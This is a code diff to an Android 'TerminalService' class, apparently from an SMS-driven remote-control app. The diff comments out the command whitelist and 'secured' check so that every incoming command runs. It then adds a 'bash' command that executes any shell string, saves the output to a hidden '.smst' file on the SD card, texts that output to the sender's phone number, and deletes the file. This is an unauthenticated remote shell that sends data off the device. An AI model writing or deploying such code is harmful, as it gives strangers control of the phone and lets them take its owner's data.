@@ -8,14 +8,19 @@ import android.media.AudioManager;
 import android.net.ConnectivityManager;
 import android.net.wifi.WifiManager;
 import android.os.IBinder;
+import android.telephony.SmsManager;
 import android.util.Log;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
 public class TerminalService extends Service{
 
-    private static final int CAMERA_REQUEST = 1888;
+    private static final int TERMINAL_REQUEST = 1000;
 
     private boolean secured = false;
 
@@ -29,10 +34,12 @@ public class TerminalService extends Service{
         command = intent.getStringExtra("command");
         number = intent.getStringExtra("number");
 
-        final String[] all_commands = getResources().getStringArray(R.array.commands);
+        /*final String[] all_commands = getResources().getStringArray(R.array.commands);
         for(int i = 0; i < all_commands.length; i++){
             if(all_commands[i].equals(command) && secured) execute();
-        }
+        }*/
+
+        execute();
 
         return super.onStartCommand(intent, flags, startId);
 
@@ -53,8 +60,11 @@ public class TerminalService extends Service{
             wifi(cmd[2]);
         } else if(cmd[1].equals("sync")){
             sync(cmd[2]);
-        } else if(cmd[1].equals("camera")){
-            camera();
+        } else if(cmd[1].equals("bash")){
+            String options = command.replace(cmd[0]+' '+cmd[1]+' ', "");
+            bash(options);
+        } else {
+            Log.i("DEV", "CMD not exists");
         }
     }
 
@@ -108,10 +118,52 @@ public class TerminalService extends Service{
         }
     }
 
-    private void camera(){
-        Intent i = new Intent(this, ForResult.class);
-        i.putExtra("request", CAMERA_REQUEST);
-        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(i);
+    private void bash(String arg){
+        arg = "cd /mnt/sdcard; " + arg + " > .smst;";
+        Log.i("DEV", arg);
+        Intent bash = new Intent(TerminalService.this, ForResult.class);
+        bash.putExtra("command", arg);
+        bash.putExtra("request", TERMINAL_REQUEST);
+        bash.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(bash);
+
+        new Thread(){
+            @Override
+            public void run(){
+                try{
+                    File file = new File("/mnt/sdcard/.smst");
+                    while(!file.exists()){}
+                    Log.i("DEV", "sleep(1000)");
+                    sleep(1000);
+                    Log.i("DEV", "file exists");
+                    StringBuilder output = new StringBuilder();
+                    try{
+                        BufferedReader br = new BufferedReader(new FileReader(file));
+                        String line;
+
+                        while((line = br.readLine()) != null){
+                            output.append(line);
+                            output.append('\n');
+                        }
+                    }catch(Exception e){
+                        e.printStackTrace();
+                    }
+                    Log.i("OUTPUT", output.toString());
+
+                    SmsManager smsManager = SmsManager.getDefault();
+                    smsManager.sendTextMessage(number, null, output.toString(), null, null);
+
+                    Log.i("DEV", "cd /mnt/sdcard; rm .smst; exit;");
+                    Intent bash = new Intent(TerminalService.this, ForResult.class);
+                    bash.putExtra("command", "cd /mnt/sdcard; rm .smst; exit;");
+                    bash.putExtra("request", TERMINAL_REQUEST);
+                    bash.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(bash);
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+            }
+        }.start();
+
     }
 }
